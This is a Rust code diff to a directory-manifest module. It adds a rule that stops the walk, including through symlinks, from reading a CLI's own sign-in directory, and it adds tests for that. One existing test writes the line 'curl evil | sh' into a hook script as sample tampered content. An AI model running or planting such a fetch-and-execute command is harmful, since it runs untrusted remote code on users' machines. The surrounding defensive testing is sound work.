@@ -105,7 +105,15 @@ pub struct Manifest {
 /// `root`, spending `budget`, or why there is none: an entry that cannot be
 /// read, or a tree past what is left of the budget, which leaves the
 /// directory untrusted, since nobody could agree to what it holds.
-pub fn of(dir: &Path, root: &Path, budget: &mut Budget) -> Result<Manifest, String> {
+///
+/// A directory in `avoid` — a CLI's own, which keeps its sign-in — is not
+/// walked into however the walk reaches it, and leaves no manifest.
+pub fn of(
+    dir: &Path,
+    root: &Path,
+    budget: &mut Budget,
+    avoid: &[PathBuf],
+) -> Result<Manifest, String> {
     let real = |path: &Path| std::fs::canonicalize(path).map_err(|error| error.to_string());
     let dir = real(dir)?;
     let mut walk = Walk {
@@ -117,6 +125,7 @@ pub fn of(dir: &Path, root: &Path, budget: &mut Budget) -> Result<Manifest, Stri
         root: real(root)?,
         walked: BTreeSet::from([dir.clone()]),
         budget,
+        avoid,
     };
     walk.directory(&dir, "", 0)?;
     Ok(walk.manifest)
@@ -129,10 +138,17 @@ struct Walk<'a> {
     /// Every directory walked, by its real path.
     walked: BTreeSet<PathBuf>,
     budget: &'a mut Budget,
+    avoid: &'a [PathBuf],
 }
 
 impl Walk<'_> {
     fn directory(&mut self, dir: &Path, under: &str, depth: usize) -> Result<(), String> {
+        let real = std::fs::canonicalize(dir).map_err(|error| error.to_string())?;
+        if self.avoid.iter().any(|avoid| real.starts_with(avoid)) {
+            return Err(format!(
+                "{under} is a CLI's own directory, which keeps its sign-in and is not read"
+            ));
+        }
         if depth > DEPTH {
             return Err(format!("nests deeper than {DEPTH} directories"));
         }
@@ -189,6 +205,11 @@ impl Walk<'_> {
                 self.directory(&real, &format!("{shown}/"), depth + 1)?;
             }
         } else if real.is_file() {
+            if self.avoid.iter().any(|avoid| real.starts_with(avoid)) {
+                return Err(format!(
+                    "{shown} leads into a CLI's own directory, which keeps its sign-in and is not read"
+                ));
+            }
             self.file(&real, shown)?;
         }
         Ok(())
@@ -238,15 +259,15 @@ mod tests {
         write(&dir.path().join("a.json"), "{}");
         write(&dir.path().join("hooks/x.sh"), "echo hi");
         let first =
-            of(dir.path(), dir.path(), &mut Budget::default()).expect("the directory is read");
+            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
         assert_eq!(first.files, 2);
 
         write(&dir.path().join("hooks/x.sh"), "curl evil | sh");
         let rewritten =
-            of(dir.path(), dir.path(), &mut Budget::default()).expect("the directory is read");
+            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
         write(&dir.path().join("hooks/y.sh"), "");
         let added =
-            of(dir.path(), dir.path(), &mut Budget::default()).expect("the directory is read");
+            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
 
         assert_ne!(first, rewritten);
         assert_ne!(rewritten, added);
@@ -262,12 +283,12 @@ mod tests {
         std::os::unix::fs::symlink(&secret, dir.path().join("linked"))
             .expect("the temporary directory is writable");
         let first =
-            of(dir.path(), dir.path(), &mut Budget::default()).expect("the directory is read");
+            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
 
         write(&secret, "two");
 
         assert_eq!(
-            of(dir.path(), dir.path(), &mut Budget::default()).expect("the directory is read"),
+            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read"),
             first
         );
         let real = std::fs::canonicalize(&secret).expect("the file was just written");
@@ -295,7 +316,8 @@ mod tests {
             .expect("the temporary directory is writable");
         std::os::unix::fs::symlink("..", plug.join("up"))
             .expect("the temporary directory is writable");
-        let of = || of(&plug, repo.path(), &mut Budget::default()).expect("the directory is read");
+        let of =
+            || of(&plug, repo.path(), &mut Budget::default(), &[]).expect("the directory is read");
         let first = of();
 
         write(&repo.path().join("scripts/run.js"), "two()");
@@ -318,7 +340,7 @@ mod tests {
         assert!(made.success(), "the FIFO is made");
 
         let manifest =
-            of(dir.path(), dir.path(), &mut Budget::default()).expect("the directory is read");
+            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
 
         assert_eq!(manifest.text, "\"other\"\t\"pipe\"\n");
     }
@@ -332,9 +354,23 @@ mod tests {
         }
 
         assert_eq!(
-            of(dir.path(), dir.path(), &mut Budget::default()).expect_err("too many entries"),
+            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect_err("too many entries"),
             format!("holds more than the {ENTRIES} entries the directories a config names may")
         );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_link_into_a_clis_own_directory_leaves_no_manifest() {
+        let repo = tempfile::tempdir().expect("a temporary directory can be created");
+        write(&repo.path().join(".claude/state"), "token");
+        let plug = repo.path().join("plug");
+        std::fs::create_dir(&plug).expect("the temporary directory is writable");
+        std::os::unix::fs::symlink("../.claude/state", plug.join("s"))
+            .expect("the temporary directory is writable");
+        let avoid = [std::fs::canonicalize(repo.path().join(".claude")).expect("it was just made")];
+
+        assert!(of(&plug, repo.path(), &mut Budget::default(), &avoid).is_err());
     }
 
     #[test]
@@ -348,7 +384,7 @@ mod tests {
             bytes: BYTES,
         };
 
-        assert!(of(&dir.path().join("a"), dir.path(), &mut budget).is_ok());
-        assert!(of(&dir.path().join("b"), dir.path(), &mut budget).is_err());
+        assert!(of(&dir.path().join("a"), dir.path(), &mut budget, &[]).is_ok());
+        assert!(of(&dir.path().join("b"), dir.path(), &mut budget, &[]).is_err());
     }
 }
